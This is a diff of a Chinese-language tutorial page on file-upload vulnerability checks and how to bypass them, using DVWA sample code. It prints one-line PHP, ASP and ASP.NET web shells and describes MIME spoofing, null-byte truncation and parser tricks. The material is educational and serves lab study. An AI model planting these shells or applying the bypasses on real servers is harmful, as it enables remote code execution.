@@ -132,36 +132,8 @@
     </p>
     
     <p>&lt; !–more–&gt;<br>一句话木马<br>PHP：<br>    <strong>&lt;?php echo shell_exec($_GET[‘a’]);?&gt;</strong><br>    <strong>&lt;?php @eval($_POST[‘a’]); ?&gt;</strong><br>ASP:<br>    <strong>&lt;%eval request(“Cknife”)%&gt;</strong><br>　<br>ASP.NET:<br>    <strong>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</strong></p>
-<p>文件上传漏洞检测<br>    1、客户端javascript检测（通常在本地检测文件的扩展名）<br>    绕过：<br>        ①禁用js<br>        ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名<br>    2、服务端检测绕过（MIME类型检测）<br>    绕过：<br>        可以通过burp拦包，将原Content-Type类型改成符合的类型。<br>    基于MIME</p>
-<pre><code>**&lt;?php  
-    if (isset($_POST[&apos;Upload&apos;])) {
-     $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
-     $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
-     $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];
-     $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type’];
-    //得到上传文件名的类型，kali里可以用mimetype 文件名来查看
-    //例如：mimetype 1.php    9527.php: application/x-php(php类型)
-    //尽管后缀名改了还是能识别真正的类型（根据内容来检测）
-     $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; //得到文件的大小
-    if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000)){
-    //这里做文件类型和文件大小的比较
-    //文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过
-    if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) 
-    {
-            echo &apos;&lt;pre&gt;&apos;;
-            echo &apos;Your image was not uploaded.&apos;;
-            echo &apos;&lt;/pre&gt;&apos;;  } 
-    else {
-            echo &apos;&lt;pre&gt;&apos;;
-            echo $target_path . &apos; succesfully uploaded!&apos;;
-            echo &apos;&lt;/pre&gt;&apos;;  }   }
-    else{
-        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;  
-        } 
-    }   
-?&gt;**
-
-3、服务端目录路径检测
+<p>文件上传漏洞检测<br>    1、客户端javascript检测（通常在本地检测文件的扩展名）<br>    绕过：<br>        ①禁用js<br>        ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名<br>    2、服务端检测绕过（MIME类型检测）<br>    绕过：<br>        可以通过burp拦包，将原Content-Type类型改成符合的类型。<br>    基于MIME<br>    <strong>&lt;?php  </strong><br>        <strong>if (isset($_POST[‘Upload’])) {</strong><br>        <strong> $target_path = DVWA_WEB_PAGE_TO_ROOT.”hackable/uploads/“;</strong><br>        <strong> $target_path = $target_path . basename($_FILES[‘uploaded’][‘name’]);</strong><br>        <strong> $uploaded_name = $_FILES[‘uploaded’][‘name’];</strong><br>        <strong>$uploaded_type = $_FILES[‘uploaded’][‘type’];</strong><br>        //得到上传文件名的类型，kali里可以用mimetype 文件名来查看<br>        //例如：mimetype 1.php    9527.php: application/x-php(php类型)<br>        //尽管后缀名改了还是能识别真正的类型（根据内容来检测）<br>        <strong> $uploaded_size = $_FILES[‘uploaded’][‘size’]; </strong><br>        //得到文件的大小<br>        <strong>if (($uploaded_type == “image/jpeg”) &amp;&amp; ($uploaded_size &lt; 100000)){</strong><br>        //这里做文件类型和文件大小的比较<br>        //文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过<br>        if(!move_uploaded_file($_FILES[‘uploaded’][‘tmp_name’], $target_path))<br>        {<br>            <strong>    echo ‘<pre>‘;</pre></strong><br>            <strong>    echo ‘Your image was not uploaded.’;</strong><br>            <strong>    echo ‘‘;  } </strong><br>        else {<br>            <strong>    echo ‘<pre>‘;</pre></strong><br>            <strong>    echo $target_path . ‘ succesfully uploaded!’;</strong><br>            <strong>    echo ‘‘;  }  </strong><br>            }<br>        else{<br>            <strong>echo ‘<pre>Your image was not uploaded.</pre>‘;  </strong><br>            }<br>        }<br>    ?&gt;</p>
+<pre><code>3、服务端目录路径检测
 绕过：
     上传时提供存储路径为image/20160704/可以修改为image/20160704/evil.php%00来截断。
     后端程序会将连接为image/20160704/evil.php%00filename.gif00截断导致最终存储为evil.php
@@ -176,7 +148,7 @@
     例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件。
 基于黑名单
 
-**&lt;?php
+**&lt;?php**
     $BlackList = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx’);
     //黑名单
     if (isset($_POST[&quot;submit&quot;])){
@@ -208,7 +180,7 @@
         echo &quot;文件不合法！！&quot;;
     }    
 }
-?&gt;**
+?&gt;
 
 （2）白名单检测：接收上传的文件做扩展名匹配，匹配上白名单中的扩展名才能上传
 绕过：
@@ -221,7 +193,7 @@
     例如：evil.jpg/.php，evil.jpg会解析为php的格式
 基于白名单
 
-**&lt;?php
+**&lt;?php**
     $WhiteList=array(&apos;rar&apos;,&apos;jpg&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;gif&apos;,&apos;jpg&apos;,&apos;doc’);
     if (isset($_POST[&quot;submit&quot;])){
         $name = $_FILES[&apos;file&apos;][&apos;name’]; 
@@ -250,7 +222,7 @@
             echo &quot;文件不合法！！&quot;;
             }        
     }
-?&gt;**
+?&gt;
 
 5、服务端文件内容检测
 图像类的文件内容检测
